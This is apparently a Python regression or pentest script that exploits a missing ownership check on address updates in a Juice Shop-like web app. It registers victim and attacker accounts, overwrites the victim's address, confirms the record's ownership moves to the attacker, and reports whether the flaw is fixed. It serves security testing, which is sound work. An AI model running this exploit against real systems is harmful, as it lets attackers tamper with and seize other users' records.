#!/usr/bin/env python3
"""pt24: PUT on an address has no ownership check, and hijacks ownership too.

Found black-box through the actual UI's address book. GET and DELETE
on this resource correctly scope to the caller's own UserId (explicit
handlers in routes/address.js). PUT has no handler function at all in
server.js's own route table, falling through to the generic Sequelize
REST default with no ownership check at all. Worse than a plain IDOR:
security.appendUserId() unconditionally overwrites the request body's
UserId to the caller's own id before the generic update runs, so a
successful attack doesn't just overwrite the victim's data, it
reassigns ownership of the record to the attacker.

Only ever touches test data this scenario itself creates; never a real
seeded address (an earlier manual probe did, by accident, and its
field-level data was restored by hand from users.yml; ownership could
not be restored through this same API, see PREREGISTRATION.md).

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt24-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_login_prime(target: str, label: str, stamp: str) -> tuple[str, int]:
    email = f"pt24-{label}-{stamp}@flatline.test"
    password = "Pt24Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    _request("GET", f"{target}/rest/user/whoami", token=token)  # prime the authenticatedUsers cache appendUserId needs
    return token, _jwt_payload(token)["data"]["id"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token, victim_id = _register_login_prime(target, "victim", stamp)
    _, create_body = _request(
        "POST", f"{target}/api/Addresss", token=victim_token,
        body={"fullName": "pt24 victim", "mobileNum": "5550000000", "zipCode": "00000",
              "streetAddress": "100 Victim Way", "city": "Flatline", "state": "FL", "country": "Flatline"},
    )
    address_id = create_body["data"]["id"]

    attacker_token, attacker_id = _register_login_prime(target, "attacker", stamp)
    exploit_status, exploit_body = _request(
        "PUT", f"{target}/api/Addresss/{address_id}", token=attacker_token,
        body={"fullName": "pt24 ATTACKER OVERWRITE", "mobileNum": "6660000000", "zipCode": "66666",
              "streetAddress": "ATTACKER", "city": "ATTACKER", "state": "AT", "country": "ATTACKER"},
    )
    ownership_reassigned_to_attacker = exploit_body.get("data", {}).get("UserId") == attacker_id

    victim_recheck_status, _ = _request("GET", f"{target}/api/Addresss/{address_id}", token=victim_token)
    victim_lost_access = victim_recheck_status == 400  # the backend's own "Malicious activity detected" shape

    if exploit_status in (401, 403, 404):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and ownership_reassigned_to_attacker and victim_lost_access:
        status = "VULNERABLE"
        summary = "Attacker's PUT succeeded, reassigned ownership to themselves, and the victim lost access to their own address."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, ownership_reassigned={ownership_reassigned_to_attacker}, victim_lost_access={victim_lost_access}."

    legit_token, legit_id = _register_login_prime(target, "legit", stamp)
    _, legit_create = _request(
        "POST", f"{target}/api/Addresss", token=legit_token,
        body={"fullName": "pt24 legit", "mobileNum": "5551111111", "zipCode": "11111",
              "streetAddress": "1 Legit Ave", "city": "Flatline", "state": "FL", "country": "Flatline"},
    )
    legit_address_id = legit_create["data"]["id"]
    legit_status, _ = _request(
        "PUT", f"{target}/api/Addresss/{legit_address_id}", token=legit_token,
        body={"fullName": "pt24 legit updated", "mobileNum": "5551111111", "zipCode": "11111",
              "streetAddress": "2 Legit Ave", "city": "Flatline", "state": "FL", "country": "Flatline"},
    )
    legitimate_self_edit_ok = legit_status == 200

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "ownership_reassigned_to_attacker": ownership_reassigned_to_attacker,
        "victim_lost_access": victim_lost_access,
        "legitimate_self_edit_ok": legitimate_self_edit_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt24-address-idor-on-update", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
